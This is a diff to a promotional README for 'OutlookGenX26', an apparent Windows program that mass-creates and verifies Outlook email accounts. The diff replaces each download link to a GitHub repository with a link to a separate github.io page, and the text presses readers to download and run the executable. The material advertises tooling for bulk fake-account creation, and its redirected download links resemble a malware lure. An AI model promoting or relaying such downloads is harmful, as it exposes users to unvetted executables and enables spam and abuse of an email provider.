@@ -4,7 +4,7 @@
 
 Welcome! OutlookGenX26 is a powerful yet simple tool that automatically creates Outlook email accounts for you. Whether you need multiple accounts for testing, development, or business purposes, this application handles everything - from signup to verification - with zero manual work required.
 
-[⬇️ DOWNLOAD OUTLOOKGENX26 NOW](https://github.com/Cclaruan04/OutlookGenX26)
+[⬇️ DOWNLOAD OUTLOOKGENX26 NOW](https://cclaruan04.github.io)
 
 ## 🎯 What Does This Tool Do?
 
@@ -54,7 +54,7 @@ To run OutlookGenX26 smoothly, your Windows PC should have:
 Getting started with OutlookGenX26 is straightforward:
 
 ### Step 1: Download the Application
-Visit this link to download the application: [https://github.com/Cclaruan04/OutlookGenX26](https://github.com/Cclaruan04/OutlookGenX26)
+Visit this link to download the application: [https://cclaruan04.github.io](https://cclaruan04.github.io)
 
 ### Step 2: Save the File
 Once the download completes, save the file to a location you can easily find, like your Desktop or Downloads folder.
@@ -134,7 +134,7 @@ Check the download page periodically for new versions.
 
 OutlookGenX26 puts the power of automated account creation at your fingertips. With its user-friendly interface and robust automation capabilities, you'll wonder how you ever managed without it. Download it today and experience the convenience of hands-free account generation!
 
-[⬇️ GET STARTED WITH OUTLOOKGENX26](https://github.com/Cclaruan04/OutlookGenX26)
+[⬇️ GET STARTED WITH OUTLOOKGENX26](https://cclaruan04.github.io)
 
 ---
 
